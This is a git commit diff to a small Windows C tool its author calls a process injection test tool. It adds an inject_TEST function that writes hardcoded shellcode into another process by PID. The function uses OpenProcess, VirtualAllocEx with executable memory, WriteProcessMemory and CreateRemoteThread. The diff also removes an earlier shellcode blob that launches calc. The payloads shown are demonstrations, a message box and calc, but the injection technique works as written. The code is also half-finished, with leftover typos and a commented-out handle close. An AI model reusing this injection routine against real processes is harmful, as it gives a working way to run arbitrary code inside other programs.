d047f2c74bb56e32e06eec3e9821197955d0b422
Mateusz <74623154+0xInvicta@users.noreply.github.com>
2022-10-02 01:07:10 +0100

    main update

--- main.c
+++ main.c
@@ -9,12 +9,17 @@
 #include <conio.h>
 #include <stdlib.h>
 
+#include "proc.h"
+
 BOOL procList(void);
 int input(void);
+void inject_TEST(void);
 
 int main() {
     while (TRUE) {
         int choice, num;
+        printf("\033[31mProcess Injecetion Automation Test Tool\033[0m\n");
+        printf("\033[31mBy: Matuesz Peplinski\033[0m\n");
         printf("[1]Begin Injection\n");
         printf("[2]Test Injection\n");
         printf("[3]List Processes\n");
@@ -27,7 +32,9 @@ int main() {
             break;
         }
         case 2: {
-
+            printf("The call to test function will be made\n");
+            printf("This function will inject codeFINSIHSHSHSHSHSHH\n");
+            inject_TEST();
             break;
         }
         case 3: {
@@ -53,63 +60,27 @@ int input()
     scanf_s("%d", &number);
     return (number);
 }
-BOOL procList(void) {
-    HANDLE hProcessSnap;
-    HANDLE hProcess;
-    PROCESSENTRY32 pe32;
-    DWORD dwPriorityClass;
 
-    // Take a snapshot of all processes in the system.
-    hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-    if (hProcessSnap == INVALID_HANDLE_VALUE)
-    {
-        puts("\033[31mERORR - UNABLE TO MAKE PROCESS SNAPSHOT \n\033[0m ");
-        return(FALSE);
-    }
-    pe32.dwSize = sizeof(PROCESSENTRY32);
+#define procID 555
 
-    // Check if able to get first proccess if Error is Spawned exit [return(FALSE)].
-    if (!Process32First(hProcessSnap, &pe32))
-    {
-        CloseHandle(hProcessSnap);
-        return(FALSE);
-    }
-
-    do
-    {
-        _tprintf(TEXT("\nPID:\033[31m%d\033[0m: [\033[36m%s\033[0m]"), pe32.th32ProcessID, pe32.szExeFile);
+void inject_TEST(void) {
+    char shellCode[] = "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x37\x59\x88\x51\x0a\xbb\x61\xd9"\
+                       "\xe7\x77\x51\xff\xd3\xeb\x39\x59\x31\xd2\x88\x51\x0b\x51\x50\xbb\x32"\
+                       "\xb3\xe7\x77\xff\xd3\xeb\x39\x59\x31\xd2\x88\x51\x03\x31\xd2\x52\x51"\
+                       "\x51\x52\xff\xd0\x31\xd2\x50\xb8\xfd\x98\xe7\x77\xff\xd0\xe8\xc4\xff"\
+                       "\xff\xff\x75\x73\x65\x72\x33\x32\x2e\x64\x6c\x6c\x4e\xe8\xc2\xff\xff"\
+                       "\xff\x4d\x65\x73\x73\x61\x67\x65\x42\x6f\x78\x41\x4e\xe8\xc2\xff\xff"\
+                       "\xff\x48\x65\x79\x4e";
 
 
-    } while (Process32Next(hProcessSnap, &pe32));
-
-    CloseHandle(hProcessSnap);
-    return(TRUE);   
-}
-void inject() {
-    char shellCode[] = \
-        "\x31\xc9\xf7\xe1\x64\x8b\x41"
-        "\x30\x8b\x40\x0c\x8b\x70\x14\xad\x96\xad\x8b"
-        "\x58\x10\x8b\x53\x3c\x01\xda\x8b\x52\x78\x01"
-        "\xda\x8b\x72\x20\x01\xde\x31\xc9\x41\xad\x01"
-        "\xd8\x81\x38\x47\x65\x74\x50\x75\xf4\x81\x78"
-        "\x0a\x72\x65\x73\x73\x75\xeb\x8b\x72\x24\x01"
-        "\xde\x66\x8b\x0c\x4e\x49\x8b\x72\x1c\x01\xde"
-        "\x8b\x14\x8e\x01\xda\x89\xd5\x31\xc9\x68\x73"
-        "\x41\x61\x61\x66\x81\x6c\x24\x02\x61\x61\x68"
-        "\x6f\x63\x65\x73\x68\x74\x65\x50\x72\x68\x43"
-        "\x72\x65\x61\x54\x53\xff\xd2\x31\xc9\xb1\xff"
-        "\x31\xff\x57\xe2\xfd\x68\x63\x61\x6c\x63\x89"
-        "\xe1\x51\x51\x31\xd2\x52\x52\x52\x52\x52\x52"
-        "\x51\x52\xff\xd0\x83\xc4\x10\x68\x65\x73\x73"
-        "\x61\x66\x83\x6c\x24\x03\x61\x68\x50\x72\x6f"
-        "\x63\x68\x45\x78\x69\x74\x54\x53\xff\xd5\x31"
-        "\xc9\x51\xff\xd0";
     HANDLE hProcess; // Handle to store remote process handle
     HANDLE hThread;
     void* exec_mem;
-    hProcess = OpenProcess(PROCESS_ALL_ACCESS, TRUE, 1352);
+
+    hProcess = OpenProcess(PROCESS_ALL_ACCESS, TRUE, procID);
     exec_mem = VirtualAllocEx(hProcess, NULL, sizeof(shellCode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
     WriteProcessMemory(hProcess, exec_mem, shellCode, sizeof(shellCode), NULL);
     hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)exec_mem, NULL, 0, 0);
-    CloseHandle(hProcess);
+
+    //CloseHandle(hProcess);
 }
